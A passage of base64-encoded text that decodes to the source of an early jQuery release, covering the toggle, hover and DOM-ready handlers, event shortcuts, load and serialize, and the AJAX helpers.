B3aGljaCBmdW5jdGlvbiB0byBleGVjdXRlCgkJCXRoaXMubGFzdFRvZ2dsZSA9IDAgPT0gdGhpcy5sYXN0VG9nZ2xlID8gMSA6IDA7CgkJCQoJCQkvLyBNYWtlIHN1cmUgdGhhdCBjbGlja3Mgc3RvcAoJCQlldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoJCQkKCQkJLy8gYW5kIGV4ZWN1dGUgdGhlIGZ1bmN0aW9uCgkJCXJldHVybiBhcmdzW3RoaXMubGFzdFRvZ2dsZV0uYXBwbHkoIHRoaXMsIGFyZ3VtZW50cyApIHx8IGZhbHNlOwoJCX0pOwoJfSwKCglob3ZlcjogZnVuY3Rpb24oZm5PdmVyLCBmbk91dCkgewoJCXJldHVybiB0aGlzLmJpbmQoJ21vdXNlZW50ZXInLCBmbk92ZXIpLmJpbmQoJ21vdXNlbGVhdmUnLCBmbk91dCk7Cgl9LAoJCglyZWFkeTogZnVuY3Rpb24oZm4pIHsKCQkvLyBBdHRhY2ggdGhlIGxpc3RlbmVycwoJCWJpbmRSZWFkeSgpOwoKCQkvLyBJZiB0aGUgRE9NIGlzIGFscmVhZHkgcmVhZHkKCQlpZiAoIGpRdWVyeS5pc1JlYWR5ICkKCQkJLy8gRXhlY3V0ZSB0aGUgZnVuY3Rpb24gaW1tZWRpYXRlbHkKCQkJZm4uY2FsbCggZG9jdW1lbnQsIGpRdWVyeSApOwoJCQkKCQkvLyBPdGhlcndpc2UsIHJlbWVtYmVyIHRoZSBmdW5jdGlvbiBmb3IgbGF0ZXIKCQllbHNlCgkJCS8vIEFkZCB0aGUgZnVuY3Rpb24gdG8gdGhlIHdhaXQgbGlzdAoJCQlqUXVlcnkucmVhZHlMaXN0LnB1c2goIGZ1bmN0aW9uKCkgeyByZXR1cm4gZm4uY2FsbCh0aGlzLCBqUXVlcnkpOyB9ICk7CgkKCQlyZXR1cm4gdGhpczsKCX0KfSk7CgpqUXVlcnkuZXh0ZW5kKHsKCWlzUmVhZHk6IGZhbHNlLAoJcmVhZHlMaXN0OiBbXSwKCS8vIEhhbmRsZSB3aGVuIHRoZSBET00gaXMgcmVhZHkKCXJlYWR5OiBmdW5jdGlvbigpIHsKCQkvLyBNYWtlIHN1cmUgdGhhdCB0aGUgRE9NIGlzIG5vdCBhbHJlYWR5IGxvYWRlZAoJCWlmICggIWpRdWVyeS5pc1JlYWR5ICkgewoJCQkvLyBSZW1lbWJlciB0aGF0IHRoZSBET00gaXMgcmVhZHkKCQkJalF1ZXJ5LmlzUmVhZHkgPSB0cnVlOwoJCQkKCQkJLy8gSWYgdGhlcmUgYXJlIGZ1bmN0aW9ucyBib3VuZCwgdG8gZXhlY3V0ZQoJCQlpZiAoIGpRdWVyeS5yZWFkeUxpc3QgKSB7CgkJCQkvLyBFeGVjdXRlIGFsbCBvZiB0aGVtCgkJCQlqUXVlcnkuZWFjaCggalF1ZXJ5LnJlYWR5TGlzdCwgZnVuY3Rpb24oKXsKCQkJCQl0aGlzLmFwcGx5KCBkb2N1bWVudCApOwoJCQkJfSk7CgkJCQkKCQkJCS8vIFJlc2V0IHRoZSBsaXN0IG9mIGZ1bmN0aW9ucwoJCQkJalF1ZXJ5LnJlYWR5TGlzdCA9IG51bGw7CgkJCX0KCQkKCQkJLy8gVHJpZ2dlciBhbnkgYm91bmQgcmVhZHkgZXZlbnRzCgkJCWpRdWVyeShkb2N1bWVudCkudHJpZ2dlckhhbmRsZXIoInJlYWR5Iik7CgkJfQoJfQp9KTsKCnZhciByZWFkeUJvdW5kID0gZmFsc2U7CgpmdW5jdGlvbiBiaW5kUmVhZHkoKXsKCWlmICggcmVhZHlCb3VuZCApIHJldHVybjsKCXJlYWR5Qm91bmQgPSB0cnVlOwoKCS8vIE1vemlsbGEsIE9wZXJhIChzZWUgZnVydGhlciBiZWxvdyBmb3IgaXQpIGFuZCB3ZWJraXQgbmlnaHRsaWVzIGN1cnJlbnRseSBzdXBwb3J0IHRoaXMgZXZlbnQKCWlmICggZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lciAmJiAhalF1ZXJ5LmJyb3dzZXIub3BlcmEpCgkJLy8gVXNlIHRoZSBoYW5keSBldmVudCBjYWxsYmFjawoJCWRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoICJET01Db250ZW50TG9hZGVkIiwgalF1ZXJ5LnJlYWR5LCBmYWxzZSApOwoJCgkvLyBJZiBJRSBpcyB1c2VkIGFuZCBpcyBub3QgaW4gYSBmcmFtZQoJLy8gQ29udGludWFsbHkgY2hlY2sgdG8gc2VlIGlmIHRoZSBkb2N1bWVudCBpcyByZWFkeQoJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICYmIHdpbmRvdyA9PSB0b3AgKSAoZnVuY3Rpb24oKXsKCQlpZiAoalF1ZXJ5LmlzUmVhZHkpIHJldHVybjsKCQl0cnkgewoJCQkvLyBJZiBJRSBpcyB1c2VkLCB1c2UgdGhlIHRyaWNrIGJ5IERpZWdvIFBlcmluaQoJCQkvLyBodHRwOi8vamF2YXNjcmlwdC5ud2JveC5jb20vSUVDb250ZW50TG9hZGVkLwoJCQlkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuZG9TY3JvbGwoImxlZnQiKTsKCQl9IGNhdGNoKCBlcnJvciApIHsKCQkJc2V0VGltZW91dCggYXJndW1lbnRzLmNhbGxlZSwgMCApOwoJCQlyZXR1cm47CgkJfQoJCS8vIGFuZCBleGVjdXRlIGFueSB3YWl0aW5nIGZ1bmN0aW9ucwoJCWpRdWVyeS5yZWFkeSgpOwoJfSkoKTsKCglpZiAoIGpRdWVyeS5icm93c2VyLm9wZXJhICkKCQlkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCAiRE9NQ29udGVudExvYWRlZCIsIGZ1bmN0aW9uICgpIHsKCQkJaWYgKGpRdWVyeS5pc1JlYWR5KSByZXR1cm47CgkJCWZvciAodmFyIGkgPSAwOyBpIDwgZG9jdW1lbnQuc3R5bGVTaGVldHMubGVuZ3RoOyBpKyspCgkJCQlpZiAoZG9jdW1lbnQuc3R5bGVTaGVldHNbaV0uZGlzYWJsZWQpIHsKCQkJCQlzZXRUaW1lb3V0KCBhcmd1bWVudHMuY2FsbGVlLCAwICk7CgkJCQkJcmV0dXJuOwoJCQkJfQoJCQkvLyBhbmQgZXhlY3V0ZSBhbnkgd2FpdGluZyBmdW5jdGlvbnMKCQkJalF1ZXJ5LnJlYWR5KCk7CgkJfSwgZmFsc2UpOwoKCWlmICggalF1ZXJ5LmJyb3dzZXIuc2FmYXJpICkgewoJCXZhciBudW1TdHlsZXM7CgkJKGZ1bmN0aW9uKCl7CgkJCWlmIChqUXVlcnkuaXNSZWFkeSkgcmV0dXJuOwoJCQlpZiAoIGRvY3VtZW50LnJlYWR5U3RhdGUgIT0gImxvYWRlZCIgJiYgZG9jdW1lbnQucmVhZHlTdGF0ZSAhPSAiY29tcGxldGUiICkgewoJCQkJc2V0VGltZW91dCggYXJndW1lbnRzLmNhbGxlZSwgMCApOwoJCQkJcmV0dXJuOwoJCQl9CgkJCWlmICggbnVtU3R5bGVzID09PSB1bmRlZmluZWQgKQoJCQkJbnVtU3R5bGVzID0galF1ZXJ5KCJzdHlsZSwgbGlua1tyZWw9c3R5bGVzaGVldF0iKS5sZW5ndGg7CgkJCWlmICggZG9jdW1lbnQuc3R5bGVTaGVldHMubGVuZ3RoICE9IG51bVN0eWxlcyApIHsKCQkJCXNldFRpbWVvdXQoIGFyZ3VtZW50cy5jYWxsZWUsIDAgKTsKCQkJCXJldHVybjsKCQkJfQoJCQkvLyBhbmQgZXhlY3V0ZSBhbnkgd2FpdGluZyBmdW5jdGlvbnMKCQkJalF1ZXJ5LnJlYWR5KCk7CgkJfSkoKTsKCX0KCgkvLyBBIGZhbGxiYWNrIHRvIHdpbmRvdy5vbmxvYWQsIHRoYXQgd2lsbCBhbHdheXMgd29yawoJalF1ZXJ5LmV2ZW50LmFkZCggd2luZG93LCAibG9hZCIsIGpRdWVyeS5yZWFkeSApOwp9CgpqUXVlcnkuZWFjaCggKCJibHVyLGZvY3VzLGxvYWQscmVzaXplLHNjcm9sbCx1bmxvYWQsY2xpY2ssZGJsY2xpY2ssIiArCgkibW91c2Vkb3duLG1vdXNldXAsbW91c2Vtb3ZlLG1vdXNlb3Zlcixtb3VzZW91dCxjaGFuZ2Usc2VsZWN0LCIgKyAKCSJzdWJtaXQsa2V5ZG93bixrZXlwcmVzcyxrZXl1cCxlcnJvciIpLnNwbGl0KCIsIiksIGZ1bmN0aW9uKGksIG5hbWUpewoJCgkvLyBIYW5kbGUgZXZlbnQgYmluZGluZwoJalF1ZXJ5LmZuW25hbWVdID0gZnVuY3Rpb24oZm4pewoJCXJldHVybiBmbiA/IHRoaXMuYmluZChuYW1lLCBmbikgOiB0aGlzLnRyaWdnZXIobmFtZSk7Cgl9Owp9KTsKCi8vIENoZWNrcyBpZiBhbiBldmVudCBoYXBwZW5lZCBvbiBhbiBlbGVtZW50IHdpdGhpbiBhbm90aGVyIGVsZW1lbnQKLy8gVXNlZCBpbiBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWVudGVyIGFuZCBtb3VzZWxlYXZlIGhhbmRsZXJzCnZhciB3aXRoaW5FbGVtZW50ID0gZnVuY3Rpb24oZXZlbnQsIGVsZW0pIHsKCS8vIENoZWNrIGlmIG1vdXNlKG92ZXJ8b3V0KSBhcmUgc3RpbGwgd2l0aGluIHRoZSBzYW1lIHBhcmVudCBlbGVtZW50Cgl2YXIgcGFyZW50ID0gZXZlbnQucmVsYXRlZFRhcmdldDsKCS8vIFRyYXZlcnNlIHVwIHRoZSB0cmVlCgl3aGlsZSAoIHBhcmVudCAmJiBwYXJlbnQgIT0gZWxlbSApIHRyeSB7IHBhcmVudCA9IHBhcmVudC5wYXJlbnROb2RlOyB9IGNhdGNoKGVycm9yKSB7IHBhcmVudCA9IGVsZW07IH0KCS8vIFJldHVybiB0cnVlIGlmIHdlIGFjdHVhbGx5IGp1c3QgbW91c2VkIG9uIHRvIGEgc3ViLWVsZW1lbnQKCXJldHVybiBwYXJlbnQgPT0gZWxlbTsKfTsKCi8vIFByZXZlbnQgbWVtb3J5IGxlYWtzIGluIElFCi8vIEFuZCBwcmV2ZW50IGVycm9ycyBvbiByZWZyZXNoIHdpdGggZXZlbnRzIGxpa2UgbW91c2VvdmVyIGluIG90aGVyIGJyb3dzZXJzCi8vIFdpbmRvdyBpc24ndCBpbmNsdWRlZCBzbyBhcyBub3QgdG8gdW5iaW5kIGV4aXN0aW5nIHVubG9hZCBldmVudHMKalF1ZXJ5KHdpbmRvdykuYmluZCgidW5sb2FkIiwgZnVuY3Rpb24oKSB7CglqUXVlcnkoIioiKS5hZGQoZG9jdW1lbnQpLnVuYmluZCgpOwp9KTsKalF1ZXJ5LmZuLmV4dGVuZCh7Cglsb2FkOiBmdW5jdGlvbiggdXJsLCBwYXJhbXMsIGNhbGxiYWNrICkgewoJCWlmICggalF1ZXJ5LmlzRnVuY3Rpb24oIHVybCApICkKCQkJcmV0dXJuIHRoaXMuYmluZCgibG9hZCIsIHVybCk7CgoJCXZhciBvZmYgPSB1cmwuaW5kZXhPZigiICIpOwoJCWlmICggb2ZmID49IDAgKSB7CgkJCXZhciBzZWxlY3RvciA9IHVybC5zbGljZShvZmYsIHVybC5sZW5ndGgpOwoJCQl1cmwgPSB1cmwuc2xpY2UoMCwgb2ZmKTsKCQl9CgoJCWNhbGxiYWNrID0gY2FsbGJhY2sgfHwgZnVuY3Rpb24oKXt9OwoKCQkvLyBEZWZhdWx0IHRvIGEgR0VUIHJlcXVlc3QKCQl2YXIgdHlwZSA9ICJHRVQiOwoKCQkvLyBJZiB0aGUgc2Vjb25kIHBhcmFtZXRlciB3YXMgcHJvdmlkZWQKCQlpZiAoIHBhcmFtcyApCgkJCS8vIElmIGl0J3MgYSBmdW5jdGlvbgoJCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBwYXJhbXMgKSApIHsKCQkJCS8vIFdlIGFzc3VtZSB0aGF0IGl0J3MgdGhlIGNhbGxiYWNrCgkJCQljYWxsYmFjayA9IHBhcmFtczsKCQkJCXBhcmFtcyA9IG51bGw7CgoJCQkvLyBPdGhlcndpc2UsIGJ1aWxkIGEgcGFyYW0gc3RyaW5nCgkJCX0gZWxzZSB7CgkJCQlwYXJhbXMgPSBqUXVlcnkucGFyYW0oIHBhcmFtcyApOwoJCQkJdHlwZSA9ICJQT1NUIjsKCQkJfQoKCQl2YXIgc2VsZiA9IHRoaXM7CgoJCS8vIFJlcXVlc3QgdGhlIHJlbW90ZSBkb2N1bWVudAoJCWpRdWVyeS5hamF4KHsKCQkJdXJsOiB1cmwsCgkJCXR5cGU6IHR5cGUsCgkJCWRhdGFUeXBlOiAiaHRtbCIsCgkJCWRhdGE6IHBhcmFtcywKCQkJY29tcGxldGU6IGZ1bmN0aW9uKHJlcywgc3RhdHVzKXsKCQkJCS8vIElmIHN1Y2Nlc3NmdWwsIGluamVjdCB0aGUgSFRNTCBpbnRvIGFsbCB0aGUgbWF0Y2hlZCBlbGVtZW50cwoJCQkJaWYgKCBzdGF0dXMgPT0gInN1Y2Nlc3MiIHx8IHN0YXR1cyA9PSAibm90bW9kaWZpZWQiICkKCQkJCQkvLyBTZWUgaWYgYSBzZWxlY3RvciB3YXMgc3BlY2lmaWVkCgkJCQkJc2VsZi5odG1sKCBzZWxlY3RvciA/CgkJCQkJCS8vIENyZWF0ZSBhIGR1bW15IGRpdiB0byBob2xkIHRoZSByZXN1bHRzCgkJCQkJCWpRdWVyeSgiPGRpdi8+IikKCQkJCQkJCS8vIGluamVjdCB0aGUgY29udGVudHMgb2YgdGhlIGRvY3VtZW50IGluLCByZW1vdmluZyB0aGUgc2NyaXB0cwoJCQkJCQkJLy8gdG8gYXZvaWQgYW55ICdQZXJtaXNzaW9uIERlbmllZCcgZXJyb3JzIGluIElFCgkJCQkJCQkuYXBwZW5kKHJlcy5yZXNwb25zZVRleHQucmVwbGFjZSgvPHNjcmlwdCgufFxzKSo/XC9zY3JpcHQ+L2csICIiKSkKCgkJCQkJCQkvLyBMb2NhdGUgdGhlIHNwZWNpZmllZCBlbGVtZW50cwoJCQkJCQkJLmZpbmQoc2VsZWN0b3IpIDoKCgkJCQkJCS8vIElmIG5vdCwganVzdCBpbmplY3QgdGhlIGZ1bGwgcmVzdWx0CgkJCQkJCXJlcy5yZXNwb25zZVRleHQgKTsKCgkJCQlzZWxmLmVhY2goIGNhbGxiYWNrLCBbcmVzLnJlc3BvbnNlVGV4dCwgc3RhdHVzLCByZXNdICk7CgkJCX0KCQl9KTsKCQlyZXR1cm4gdGhpczsKCX0sCgoJc2VyaWFsaXplOiBmdW5jdGlvbigpIHsKCQlyZXR1cm4galF1ZXJ5LnBhcmFtKHRoaXMuc2VyaWFsaXplQXJyYXkoKSk7Cgl9LAoJc2VyaWFsaXplQXJyYXk6IGZ1bmN0aW9uKCkgewoJCXJldHVybiB0aGlzLm1hcChmdW5jdGlvbigpewoJCQlyZXR1cm4galF1ZXJ5Lm5vZGVOYW1lKHRoaXMsICJmb3JtIikgPwoJCQkJalF1ZXJ5Lm1ha2VBcnJheSh0aGlzLmVsZW1lbnRzKSA6IHRoaXM7CgkJfSkKCQkuZmlsdGVyKGZ1bmN0aW9uKCl7CgkJCXJldHVybiB0aGlzLm5hbWUgJiYgIXRoaXMuZGlzYWJsZWQgJiYgCgkJCQkodGhpcy5jaGVja2VkIHx8IC9zZWxlY3R8dGV4dGFyZWEvaS50ZXN0KHRoaXMubm9kZU5hbWUpIHx8IAoJCQkJCS90ZXh0fGhpZGRlbnxwYXNzd29yZC9pLnRlc3QodGhpcy50eXBlKSk7CgkJfSkKCQkubWFwKGZ1bmN0aW9uKGksIGVsZW0pewoJCQl2YXIgdmFsID0galF1ZXJ5KHRoaXMpLnZhbCgpOwoJCQlyZXR1cm4gdmFsID09IG51bGwgPyBudWxsIDoKCQkJCXZhbC5jb25zdHJ1Y3RvciA9PSBBcnJheSA/CgkJCQkJalF1ZXJ5Lm1hcCggdmFsLCBmdW5jdGlvbih2YWwsIGkpewoJCQkJCQlyZXR1cm4ge25hbWU6IGVsZW0ubmFtZSwgdmFsdWU6IHZhbH07CgkJCQkJfSkgOgoJCQkJCXtuYW1lOiBlbGVtLm5hbWUsIHZhbHVlOiB2YWx9OwoJCX0pLmdldCgpOwoJfQp9KTsKCi8vIEF0dGFjaCBhIGJ1bmNoIG9mIGZ1bmN0aW9ucyBmb3IgaGFuZGxpbmcgY29tbW9uIEFKQVggZXZlbnRzCmpRdWVyeS5lYWNoKCAiYWpheFN0YXJ0LGFqYXhTdG9wLGFqYXhDb21wbGV0ZSxhamF4RXJyb3IsYWpheFN1Y2Nlc3MsYWpheFNlbmQiLnNwbGl0KCIsIiksIGZ1bmN0aW9uKGksbyl7CglqUXVlcnkuZm5bb10gPSBmdW5jdGlvbihmKXsKCQlyZXR1cm4gdGhpcy5iaW5kKG8sIGYpOwoJfTsKfSk7Cgp2YXIganNjID0gKG5ldyBEYXRlKS5nZXRUaW1lKCk7CgpqUXVlcnkuZXh0ZW5kKHsKCWdldDogZnVuY3Rpb24oIHVybCwgZGF0YSwgY2FsbGJhY2ssIHR5cGUgKSB7CgkJLy8gc2hpZnQgYXJndW1lbnRzIGlmIGRhdGEgYXJndW1lbnQgd2FzIG9tbWl0ZWQKCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBkYXRhICkgKSB7CgkJCWNhbGxiYWNrID0gZGF0YTsKCQkJZGF0YSA9IG51bGw7CgkJfQoJCQoJCXJldHVybiBqUXVlcnkuYWpheCh7CgkJCXR5cGU6ICJHRVQiLAoJCQl1cmw6IHVybCwKCQkJZGF0YTogZGF0YSwKCQkJc3VjY2VzczogY2FsbGJhY2ssCgkJCWRhdGFUeXBlOiB0eXBlCgkJfSk7Cgl9LAoKCWdldFNjcmlwdDogZnVuY3Rpb24oIHVybCwgY2FsbGJhY2sgKSB7CgkJcmV0dXJuIGpRdWVyeS5nZXQodXJsLCBudWxsLCBjYWxsYmFjaywgInNjcmlwdCIpOwoJfSwKCglnZXRKU09OOiBmdW5jdGlvbiggdXJsLCBkYXRhLCBjYWxsYmFjayApIHsKCQlyZXR1cm4galF1ZXJ5LmdldCh1cmwsIGRhdGEsIGNhbGxiYWNrLCAianNvbiIpOwoJfSwKCglwb3N0OiBmdW5jdGlvbiggdXJsLCBkYXRhLCBjYWxsYmFjaywgdHlwZSApIHsKCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBkYXRhICkgKSB7CgkJCWNhbGxiYWNrID0gZGF0YTsKCQkJZGF0YSA9IHt9OwoJCX0KCgkJcmV0dXJuIGpRdWVyeS5hamF4KHsKCQkJdHlwZTogIlBPU1QiLAoJCQl1cmw6IHVybCwKCQkJZGF0YTogZGF0YSwKCQkJc3VjY2VzczogY2FsbGJhY2ssCgkJCWRhdGFUeXBlOiB0eXBlCgkJfSk7Cgl9LAoKCWFqYXhTZXR1cDogZnVuY3Rpb24oIHNldHRpbmdzICkgewoJCWpRdWVyeS5leHRlbmQoIGpRdWVyeS5hamF4U2V0dGluZ3MsIHNldHRpbmdzICk7Cgl9LAoKCWFqYXhTZXR0aW5nczogewoJCWdsb2JhbDogdHJ1ZSwKCQl0eXBlOiAiR0VUIiwKCQl0aW1lb3V0OiAwLAoJCWNvbnRlbnRUeXBlOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwKCQlwcm9jZXNzRGF0YTogdHJ1ZSwKCQlhc3luYzogdHJ1ZSwKCQlkYXRhOiBudWxsLAoJCXVzZXJuYW1lOiBudWxsLAoJCXBhc3N3b3JkOiBudWxsLAoJCWFjY2VwdHM6IHsKCQkJeG1sOiAiYXBwbGljYXRpb24veG1sLCB0ZXh0L3htbCIsCgkJCWh0bWw6ICJ0ZXh0L2h0bWwiLAoJCQlzY3JpcHQ6ICJ0ZXh0L2phdmFzY3JpcHQsIGFwcGxpY2F0aW9uL2phdmFzY3JpcHQiLAoJCQlqc29uOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0IiwKCQkJdGV4dDogInRleHQvcGxhaW4iLAoJCQlfZGVmYXVsdDogIiovKiIKCQl9Cgl9LAoJCgkvLyBMYXN0LU1vZGlmaWVkIGhlYWRlciBjYWNoZSBmb3IgbmV4dCByZXF1ZXN0CglsYXN0TW9kaWZpZWQ6IHt9LAoKCWFqYXg6IGZ1bmN0aW9uKCBzICkgewoJCXZhciBqc29ucCwganNyZSA9IC89XD8oJnwkKS9nLCBzdGF0dXMsIGRhdGE7CgoJCS8vIEV4dGVuZCB0aGUgc2V0dGluZ3MsIGJ1dCByZS1leHRlbmQgJ3MnIHNvIHRoYXQgaXQgY2FuIGJlCgkJLy8gY2hlY2tlZCBhZ2FpbiBsYXRlciAoaW4gdGhlIHRlc3Qgc3VpdGUsIHNwZWNpZmljYWxseSkKCQlzID0galF1ZXJ5LmV4dGVuZCh0cnVlLCBzLCBqUXVlcnkuZXh0ZW5kKHRydWUsIHt9LCBqUXVlcnkuYWpheFNldHRpbmdzLCBzKSk7CgoJCS8vIGNvbnZlcnQgZGF0YSBpZiBub3QgYWxyZWFkeSBhIHN0cmluZwoJCWlmICggcy5kYXRhICYmIHMucHJvY2Vzc0RhdGEgJiYgdHlwZW9mIHMuZGF0YSAhPSAic3RyaW5nIiApCgkJCXMuZGF0YSA9IGpRdWVyeS5wYXJhbShzLmRhdGEpOwoKCQkvLyBIYW5kbGUgSlNPTlAgUGFyYW1ldGVyIENhbGxiYWNrcwoJCWlmICggcy5kYXRhVHlwZSA9PSAianNvbnAiICkgewoJCQlpZiAoIHMudHlwZS50b0xvd2VyQ2FzZSgpID09ICJnZXQiICkgewoJCQkJaWYgKCAhcy51cmwubWF0Y2goanNyZSkgKQoJCQkJCXMudXJsICs9IChzLnVybC5tYXRjaCgvXD8vKSA/ICImIiA6ICI/IikgKyAocy5qc29ucCB8fCAiY2FsbGJhY2siKSArICI9PyI7CgkJCX0gZWxzZSBpZiAoICFzLmRhdGEgfHwgIXMuZGF0YS5tYXRjaChqc3JlKSApCgkJCQlzLmRhdGEgPSAocy5kYXRhID8gcy5kYXRhICsgIiYiIDogIiIpICsgKHMuanNvbnAgfHwgImNhbGxiYWNrIikgKyAiPT8iOwoJCQlzLmRhdGFUeXBlID0gImpzb24iOwoJCX0KCgkJLy8gQnVpbGQgdGVtcG9yYXJ5IEpTT05QIGZ1bmN0aW9uCgkJaWYgKCBzLmRhdGFUeXBlID09ICJqc29uIiAmJiAocy5kYXRhICYmIHMuZGF0YS5tYXRjaChqc3JlKSB8fCBzLnVybC5tYXRjaChqc3JlKSkgKSB7CgkJCWpzb25wID0gImpzb25wIiArIGpzYysrOwoKCQkJLy8gUmVwbGFjZSB0aGUgPT8gc2VxdWVuY2UgYm90aCBpbiB0aGUgcXVlcnkgc3RyaW5nIGFuZCB0aGUgZGF0YQoJCQlpZiAoIHMuZGF0YSApCgkJCQlzLmRhdGEgPSAocy5kYXRhICsgIiIpLnJlcGxhY2UoanNyZSwgIj0iICsganNvbnAgKyAiJDEiKTsKCQkJcy51cmwgPSBzLnVybC5yZXBsYWNlKGpzcmUsICI9IiArIGpzb25wICsgIiQxIik7CgoJCQkvLyBXZSBuZWVkIHRvIG1ha2Ugc3VyZQoJCQkvLyB0aGF0IGEgSlNPTlAgc3R5bGUgcmVzcG9uc2UgaXMgZXhlY3V0ZWQgcHJvcGVybHkKCQkJcy5kYXRhVHlwZSA9ICJzY3JpcHQiOwoKCQkJLy8gSGFuZGxlIEpTT05QLXN0eWxlIGxvYWRpbmcKCQkJd2luZG93WyBqc29ucCBdID0gZnVuY3Rpb24odG1wKXsKCQkJCWRhdGEgPSB0bXA7CgkJCQlzdWNjZXNzKCk7CgkJCQljb21wbGV0ZSgpOwoJCQkJLy8gR2FyYmFnZSBjb2xsZWN0CgkJCQl3aW5kb3dbIGpzb25wIF0gPSB1bmRlZmluZWQ7CgkJCQl0cnl7IGRlbGV0ZSB3aW5kb3dbIGpzb25wIF07IH0gY2F0Y2goZSl7fQoJCQkJaWYgKCBoZWFkICkKCQkJCQloZWFkLnJlbW92ZUNoaWxkKCBzY3JpcHQgKTsKCQkJfTsKCQl9CgoJCWlmICggcy5kYXRhVHlwZSA9PSAic2NyaXB0IiAmJiBzLmNhY2hlID09IG51bGwgKQoJCQlzLmNhY2hlID0gZmFsc2U7CgoJCWlmICggcy5jYWNoZSA9PT0gZmFsc2UgJiYgcy50eXBlLnRvTG93ZXJDYXNlKCkgPT0gImdldCIgKSB7CgkJCXZhciB0cyA9IChuZXcgRGF0ZSgpKS5nZXRUaW1lKCk7CgkJCS8vIHRyeSByZXBsYWNpbmcgXz0gaWYgaXQgaXMgdGhlcmUKCQkJdmFyIHJldCA9IHMudXJsLnJlcGxhY2UoLyhcP3wmKV89Lio/KCZ8JCkvLCAiJDFfPSIgKyB0cyArICIkMiIpOwoJCQkvLyBpZiBub3RoaW5nIHdhcyByZXBsYWNlZCwgYWRkIHRpbWVzdGFtcCB0byB0aGUgZW5kCgkJCXMudXJsID0gcmV0ICsgKChyZXQgPT0gcy51cmwpID8gKHMudXJsLm1hdGNoKC9cPy8pID8gIiYiIDogIj8iKSArICJfPSIgKyB0cyA6ICIiKTsKCQl9CgoJCS8vIElmIGRhdGEgaXMgYXZhaWxhYmxlLCBhcHBlbmQgZGF0YSB0byB1cmwgZm9yIGdldCByZXF1ZXN0cwoJCWlmICggcy5kYXRhICYmIHMudHlwZS50b0xvd2VyQ2FzZSgpID09ICJnZXQiICkgewoJCQlzLnVybCArPSAocy51cmwubWF0Y2goL1w/LykgPyAiJiIgOiAiPyIpICsgcy5kYXRhOwoKCQkJLy8gSUUgbGlrZXMgdG8gc2VuZCBib3RoIGdldCBhbmQgcG9zdCBkYXRhLCBwcmV2ZW50IHRoaXMKCQkJcy5kYXRhID0gbnVsbDsKCQl9CgoJCS8vIFdhdGNoIGZvciBhIG5ldyBzZXQgb2YgcmVxdWVzdHMKCQlpZiAoIHMuZ2xvYmFsICYmICEgalF1ZXJ5LmFjdGl2ZSsrICkKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoICJhamF4U3RhcnQiICk7CgoJCS8vIElmIHdlJ3JlIHJlcXVlc3RpbmcgYSByZW1vdGUgZG9jdW1lbnQKCQkvLyBhbmQgdHJ5aW5nIHRvIGxvYWQgSlNPTiBvciBTY3JpcHQgd2l0aCBhIEdFVAoJCWlmICggKCFzLnVybC5pbmRleE9mKCJodHRwIikgfHwgIXMudXJsLmluZGV4T2YoIi8vIikpICYmIHMuZGF0YVR5cGUgPT0gInNjcmlwdCIgJiYgcy50eXBlLnRvTG93ZXJDYXNlKCkgPT0gImdldCIgKSB7CgkJCXZhciBoZWFkID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImhlYWQiKVswXTsKCQkJdmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwoJCQlzY3JpcHQuc3JjID0gcy51cmw7CgkJCWlmIChzLnNjcmlwdENoYXJzZXQpCgkJCQlzY3JpcHQuY2hhcnNldCA9IHMuc2NyaXB0Q2hhcnNldDsKCgkJCS8vIEhhbmRsZSBTY3JpcHQgbG9hZGluZwoJCQlpZiAoICFqc29ucCApIHsKCQkJCXZhciBkb25lID0gZmFsc2U7CgoJCQkJLy8gQXR0YWNoIGhhbmRsZXJzIGZvciBhbGwgYnJvd3NlcnMKCQkJCXNjcmlwdC5vbmxvYWQgPSBzY3JpcHQub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb24oKXsKCQkJCQlpZiAoICFkb25lICYmICghdGhpcy5yZWFkeVN0YXRlIHx8IAoJCQkJCQkJdGhpcy5yZWFkeVN0YXRlID09ICJsb2FkZWQiIHx8IHRoaXMucmVhZHlTdGF0ZSA9PSAiY29tcGxldGUiKSApIHsKCQkJCQkJZG9uZSA9IHRydWU7CgkJCQkJCXN1Y2Nlc3MoKTsKCQkJCQkJY29tcGxldGUoKTsKCQkJCQkJaGVhZC5yZW1vdmVDaGlsZCggc2NyaXB0ICk7CgkJCQkJfQoJCQkJfTsKCQkJfQoKCQkJaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOwoKCQkJLy8gV2UgaGFuZGxlIGV2ZXJ5dGhpbmcgdXNpbmcgdGhlIHNjcmlwdCBlbGVtZW50IGluamVjdGlvbgoJCQlyZXR1cm4gdW5kZWZpbmVkOwoJCX0KCgkJdmFyIHJlcXVlc3REb25lID0gZmFsc2U7CgoJCS8vIENyZWF0ZSB0aGUgcmVxdWVzdCBvYmplY3Q7IE1pY3Jvc29mdCBmYWlsZWQgdG8gcHJvcGVybHkKCQkvLyBpbXBsZW1lbnQgdGhlIFhNTEh0dHBSZXF1ZXN0IGluIElFNywgc28gd2UgdXNlIHRoZSBBY3RpdmVYT2JqZWN0IHdoZW4gaXQgaXMgYXZhaWxhYmxlCgkJdmFyIHhtbCA9IHdpbmRvdy5BY3RpdmVYT2JqZWN0ID8gbmV3IEFjdGl2ZVhPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIikgOiBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCgkJLy8gT3BlbiB0aGUgc29ja2V0CgkJeG1sLm9wZW4ocy50eXBlLCBzLnVybCwgcy5hc3luYywgcy51c2VybmFtZSwgcy5wYXNzd29yZCk7CgoJCS8vIE5lZWQgYW4gZXh0cmEgdHJ5L2NhdGNoIGZvciBj